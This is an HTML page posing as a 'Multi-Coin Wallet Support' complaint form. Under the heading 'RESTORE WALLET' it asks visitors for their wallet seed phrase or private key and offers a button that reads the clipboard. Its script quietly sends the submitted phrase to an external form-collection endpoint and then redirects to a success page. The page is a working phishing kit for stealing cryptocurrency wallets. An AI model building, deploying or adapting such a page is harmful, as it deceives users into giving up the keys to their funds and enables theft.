<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>verify wallet</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
  body {
    font-family: Arial, sans-serif;
    background: #f4f6f9;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }

  .container {
    background: #ffffff;
    padding: 25px;
    width: 100%;
    max-width: 450px;
    border-radius: 10px;
    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
  }

  h2 {
    text-align: center;
    margin-bottom: 20px;
  }

  input, textarea {
    width: 100%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 6px;
    font-size: 14px;
  }

  textarea {
    resize: none;
    height: 140px;
  }

  .field {
    margin-bottom: 15px;
  }

  .required-text {
    font-size: 11px;
    color: #888;
    margin-top: 4px;
  }

  .textarea-row {
    display: flex;
    gap: 8px;
    align-items: flex-start;
  }

  .paste-btn {
    background: #1877f2;
    color: white;
    border: none;
    padding: 10px;
    border-radius: 6px;
    cursor: pointer;
    font-size: 13px;
    white-space: nowrap;
  }

  .paste-btn:hover {
    background: #0f5dc2;
  }

  .submit-btn {
    width: 100%;
    padding: 12px;
    background: #28a745;
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    cursor: pointer;
  }

  .submit-btn:hover {
    background: #1e7e34;
  }

  .success-message {
    display: none;
    text-align: center;
    color: green;
    margin-top: 10px;
  }
</style>
</head>

<body>
<div class="container">
  <h2>Multi-Coin Wallet Support</h2>
  <p>login to submit your complaint and fix your wallet related issues</p>

  <form id="complaintForm">
    <input type="text" name="username" placeholder="Wallet Name" required>

    <div class="textarea-wrapper">
      <textarea id="complaintBox" name="complaint" placeholder="input Phrase" required></textarea>
      
      <!-- ✅ Small Paste Button -->
      <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
    </div>
     <div class="required-text">Enter seed phrase or private key
Input your seed phrases with spacing. Supports 12-word, 24-word seed phrases and private keys for all wallet types</div>

    <button type="submit" class="submit-btn">RESTORE WALLET</button>
  </form>
</div>

<script>
  async function pasteClipboard() {
    try {
      const text = await navigator.clipboard.readText();
      document.getElementById("complaintBox").value += text;
    } catch (err) {
      alert("Clipboard access denied!");
    }
  }

  const form = document.getElementById("complaintForm");

  form.addEventListener("submit", function(e) {
    e.preventDefault();

    const formData = new FormData(form);

    fetch("https://formgrid.dev/api/f/FORMGRID_ENDPOINT", {
      method: "POST",
      body: formData
    })
    .then(res => {
      if (res.ok) {
        window.location.href = "success.html";
      } else {
        alert("Submission failed!");
      }
    })
    .catch(err => {
      alert("Error submitting form");
    });
  });
</script>

</body>
</html>
